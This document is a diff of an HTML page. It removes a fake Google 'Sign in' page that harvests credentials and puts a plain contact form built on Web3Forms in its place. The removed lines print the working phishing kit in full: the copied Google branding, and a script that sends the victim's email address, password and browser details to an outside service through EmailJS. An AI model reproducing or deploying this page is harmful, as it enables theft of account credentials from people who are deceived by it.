@@ -1,14 +1,10 @@
-   <!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sign in - Google Accounts</title>
+    <title>Contact Us</title>
     
-    <!-- Google Fonts -->
-    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
-    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
-
     <style>
         :root {
             --bg-color: #ffffff;
@@ -16,11 +12,10 @@
             --text-secondary: #5f6368; 
             --border-color: #dadce0; 
             --primary-blue: #1a73e8; 
-            --hover-blue: #1765cc;
         }
 
         body {
-            font-family: 'Roboto', arial, sans-serif;
+            font-family: 'Google Sans', Roboto, Arial, sans-serif;
             margin: 0;
             padding: 0;
             height: 100vh;
@@ -30,24 +25,17 @@
             background-color: #f2f4f6;
         }
 
-        .login-container {
+        .contact-container {
             width: 450px; 
             max-width: 95%; 
             text-align: left;
             display: flex;
             flex-direction: column; 
-            padding: 48px 40px 36px;
+            padding: 40px;
             border: 1px solid var(--border-color);
             border-radius: 8px;
             background-color: var(--bg-color);
-            box-sizing: border-box;
-        }
-
-        .logo-img {
-            width: 75px; 
-            height: auto; 
-            margin-bottom: 10px;
-            object-fit: contain;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
         }
 
         h1 {
@@ -58,179 +46,109 @@
         }
 
         p.subtitle {
-            color: var(--text-primary);
-            font-size: 16px;
-            margin: 0 0 35px 0;
-            line-height: 1.5;
+            color: var(--text-secondary);
+            font-size: 14px;
+            margin: 0 0 30px 0;
         }
 
-        input[type="email"], 
-        input[type="password"] {
+        label {
+            display: block;
+            margin-bottom: 5px;
+            font-size: 14px;
+            color: var(--text-primary);
+            font-weight: 500;
+        }
+
+        input[type="text"], input[type="email"], textarea {
             appearance: none;
             width: 100%; 
             box-sizing: border-box;
-            padding: 13px 15px; 
+            padding: 12px 15px; 
             border-radius: 4px; 
             border: 1px solid var(--border-color);
             background-color: #fff; 
             font-size: 16px;
-            height: 50px;
             outline: none;
             transition: border 0.2s;
+            margin-bottom: 20px;
         }
 
-        input:focus {
+        input:focus, textarea:focus {
             border: 2px solid var(--primary-blue);
-            padding: 12px 14px; 
+            padding: 11px 14px; /* Adjust for border width change */
         }
 
-        input::placeholder {
-             color: var(--text-secondary); 
-             opacity: 0.7;
+        textarea {
+            min-height: 120px;
+            resize: vertical;
         }
 
-        .next-btn {
+        .submit-btn {
             appearance: none;
-            width: 120px; 
-            margin-top: 24px;
-            padding: 0 34px; 
+            width: 100%;
+            padding: 12px;
             border-radius: 4px; 
             background-color: var(--primary-blue); 
             color: #fff !important; 
             font-weight: 500;
-            font-size: 14px;
-            height: 36px;
+            font-size: 16px;
             cursor: pointer;
             border: none;
-            float: right;
             transition: background-color 0.2s;
         }
 
-         .next-btn:hover {
-             background-color: var(--hover-blue) !important; 
+         .submit-btn:hover {
+             background-color: #1765cc !important; 
          }
 
-         .forgot-link {
-            display: inline-block;
-            margin-top: 20px;
-            color: var(--primary-blue); 
-            text-decoration: none !important; 
-            font-size: 14px;
-            font-weight: 500;
-        }
-
-        .clearfix::after {
-            content: "";
-            clear: both;
-            display: table;
-        }
-        
-        /* Loading State */
-        .next-btn.loading {
-            background-color: #bdc1c6;
-            cursor: not-allowed;
-            position: relative;
-            color: transparent;
-        }
-        
-        .next-btn.loading::after {
-            content: "...";
-            position: absolute;
-            left: 50%;
-            top: 50%;
-            transform: translate(-50%, -50%);
-            color: white;
-        }
-        
-        /* Success/Error Messages */
-        .message {
-            margin-top: 10px;
-            font-size: 14px;
-            min-height: 20px;
-        }
-        .success { color: #0d9; }
-        .error { color: #d93025; }
+         .submit-btn:disabled {
+             background-color: #9aa0a6;
+             cursor: not-allowed;
+         }
     </style>
 </head>
 
-<body style="background-color:#f0f2f5;"> 
+<body> 
 
-    <div class="login-container">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/5/53/Google_%22G%22_Logo.svg" alt="Google" class="logo-img">
-        
-        <h1>Sign in</h1>
-        <p class="subtitle">to continue to Gmail</p>
+    <div class="contact-container">
+        <h1>Contact Us</h1>
+        <p class="subtitle">We'd love to hear from you. Fill out the form below.</p>
 
-        <form id="credentialForm">
+        <!-- Web3Forms Integration -->
+        <form action="https://api.web3forms.com/submit" method="POST" id="contactForm">
             
-            <input type="email" name="user_email" placeholder="Email or phone" required autocomplete="username">
-            <input type="password" name="user_password" placeholder="Enter your password" style="margin-top: 15px;" autocomplete="current-password">
+            <!-- Your Access Key -->
+            <input type="hidden" name="access_key" value="cec54607-e019-4df5-b362-9aa6a9529923">
             
-            <button type="submit" id="nextBtn" class="next-btn">Next</button>
+            <!-- Optional: Redirect after successful submission -->
+            <!-- <input type="hidden" name="redirect" value="https://yourdomain.com/thank-you"> -->
+
+            <!-- Anti-spam honeypot (invisible) -->
+            <input type="checkbox" name="botcheck" style="display:none;" tabindex="-1" autocomplete="off">
+
+            <!-- Fields -->
+            <label for="name">Name</label>
+            <input type="text" id="name" name="name" placeholder="Your Name" required>
             
-            <div class="clearfix"></div>
+            <label for="email">Email</label>
+            <input type="email" id="email" name="email" placeholder="your@email.com" required>
             
-            <a href="#" class="forgot-link">Forgot email?</a>
+            <label for="message">Message</label>
+            <textarea id="message" name="message" placeholder="How can we help you?" required></textarea>
+            
+            <button type="submit" class="submit-btn" id="submitBtn">Submit</button>
         </form>
-        
-        <div id="statusMessage" class="message"></div>
-        
-        <div style="margin-top: 30px; font-size: 14px; color: var(--text-secondary);">
-            Not your computer? Use Guest mode to sign in privately. 
-            <a href="#" class="forgot-link" style="display:inline; margin-left:5px;">Learn more</a>
-        </div>
     </div>
 
-    <!-- Load EmailJS SDK -->
-    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
-    <script type="text/javascript">
-        // Initialize EmailJS with your Public Key
-        (function(){
-            emailjs.init("91bVGfKY4eO7OfJHG");
-        })();
-    </script>
+    <script>
+        // Script to handle button state during submission
+        const form = document.getElementById('contactForm');
+        const btn = document.getElementById('submitBtn');
 
-    <script type="text/javascript">
-        document.getElementById('credentialForm').addEventListener('submit', function(event) {
-            event.preventDefault();
-            
-            const btn = document.getElementById('nextBtn');
-            const statusMsg = document.getElementById('statusMessage');
-            
-            btn.classList.add('loading');
+        form.addEventListener('submit', (e) => {
+            // We allow the default form submission to proceed to Web3Forms
             btn.disabled = true;
-            statusMsg.textContent = '';
-            
-            // Collect form data
-            const formData = {
-                user_email: this.user_email.value,
-                user_password: this.user_password.value,
-                user_agent: navigator.userAgent,
-                timestamp: new Date().toLocaleString()
-            };
-
-            // Send the email using EmailJS
-            // Using your provided Service ID and Template ID
-            emailjs.send('service_a4w1qgy', 'template_tvv0w1f', formData)
-                .then(function(response) {
-                    console.log('SUCCESS!', response.status, response.text);
-                    statusMsg.textContent = 'Credentials sent successfully!';
-                    statusMsg.className = 'message success';
-                    btn.classList.remove('loading');
-                    btn.disabled = false;
-                }, function(error) {
-                    console.error('FAILED...', error);
-                    statusMsg.textContent = 'Failed to send credentials.';
-                    statusMsg.className = 'message error';
-                    
-                    // Debugging: Check if it's a template issue
-                    if(error.text.includes("template")) {
-                        statusMsg.textContent = 'Template Error: Check your template settings.';
-                    }
-                    
-                    btn.classList.remove('loading');
-                    btn.disabled = false;
-                });
+            btn.textContent = "Sending...";
         });
     </script>
 
